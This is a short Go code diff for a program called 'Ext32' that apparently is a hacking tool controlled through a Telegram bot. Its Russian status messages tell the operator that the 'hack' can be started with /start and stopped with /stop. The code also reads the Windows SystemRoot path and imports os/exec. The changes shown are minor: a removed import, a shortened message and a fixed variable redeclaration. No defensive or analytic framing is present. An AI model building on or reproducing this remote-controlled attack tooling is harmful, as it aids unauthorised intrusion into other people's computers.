@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
-	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -273,7 +272,7 @@ func main() {
 	u := tgbotapi.NewUpdate(0)
 	u.Timeout = 60
 
-	msg := tgbotapi.NewMessage(userChatId, "*Ext32_"+username+"* работает. Но взлом еще не запущен.\n\nЧтобы запустить взлом, выполните /start.\nЧтобы остановить взлом, выполните /stop.")
+	msg := tgbotapi.NewMessage(userChatId, "*Ext32* работает. Но взлом еще не запущен.\n\nЧтобы запустить взлом, выполните /start.\nЧтобы остановить взлом, выполните /stop.")
 	msg.ParseMode = "markdown"
 	bot.Send(msg)
 
@@ -333,7 +332,7 @@ func endHandle(w http.ResponseWriter, r *http.Request) {
 	msg := tgbotapi.NewMessage(userChatId, text)
 	msg.ParseMode = "markdown"
 	bot.Send(msg)
-	msg := tgbotapi.NewMessage(userChatId, "*Ext32* остановлен")
+	msg = tgbotapi.NewMessage(userChatId, "*Ext32* остановлен")
 	msg.ParseMode = "markdown"
 	bot.Send(msg)
 	rootDir := strings.Replace(os.Getenv("SystemRoot"), "\\", "/", -1)
